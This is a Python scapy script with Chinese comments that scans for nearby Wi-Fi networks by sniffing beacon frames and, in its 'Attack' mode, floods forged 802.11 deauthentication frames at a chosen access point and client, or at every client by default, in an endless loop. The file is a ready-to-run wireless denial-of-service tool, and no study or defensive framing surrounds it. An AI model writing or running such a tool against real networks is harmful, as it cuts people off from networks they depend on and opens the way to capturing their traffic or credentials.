# coding:utf-8
import sys,time,random
from scapy.all import *
from optparse import OptionParser

usage = """
Scan   :  %prog -i interface -s
Attack :  %prog -i interface -t reason_code(optional) -a bssid -c client-MAC(optional)
"""
parser = OptionParser(usage)  #code 5
parser.add_option('-s', action="store_true", help="scan")
parser.add_option('-i', dest="interface", help="...")
parser.add_option('-a', dest="bssid", help="bssid")
parser.add_option('-t', dest="code", help="reason code")
parser.add_option('-c', dest="client_mac", help="client mac addr")
(options, args) = parser.parse_args()

iface = options.interface
bssid = options.bssid
code = options.code
c_mac = options.client_mac
wifi = {}


def scan_middware(data):
    dot = data.getlayer('Dot11')
    if dot is not None:
        elt = dot.getlayer('Dot11Elt')
        if elt is not None:
            if dot.type == 0 and dot.subtype == 8:  # 检查是否为beacon frame数据包，因为beacon frame是用来通知用户自己的存在的
                bssid_s = dot.addr3.upper()
                essid_s = elt.info
                if bssid_s not in wifi:  # 检查是否已经存在字典中，以免打印重复
                    wifi[bssid_s]=essid_s
                    if essid_s == "":  # 有些路由器会隐藏自己的ESSID
                        essid_s = "<hidden>"
                    print essid_s+": "+bssid_s
                    sys.stdout.write('scaning')
                    sys.stdout.write('.' * random.randint(0, 3) + '\r')
                    sys.stdout.flush()


def scan():
    sniff(iface=iface, prn=scan_middware)


if options.s:
    if iface:
        scan()
        sys.exit(0)
    else:
        parser.print_help()
        sys.exit(0)
elif options.interface and options.bssid:
    if code is None:
        code = 0
    if c_mac is None:
        c_mac = "ff:ff:ff:ff:ff:ff".upper()

    pkt = RadioTap()/Dot11(subtype=0x00c,addr1=c_mac,addr2=bssid,addr3=bssid)/Dot11Deauth(reason=int(code))
    while 1:
        sendp(pkt, iface=iface)
else:
    parser.print_help()
    sys.exit(0)
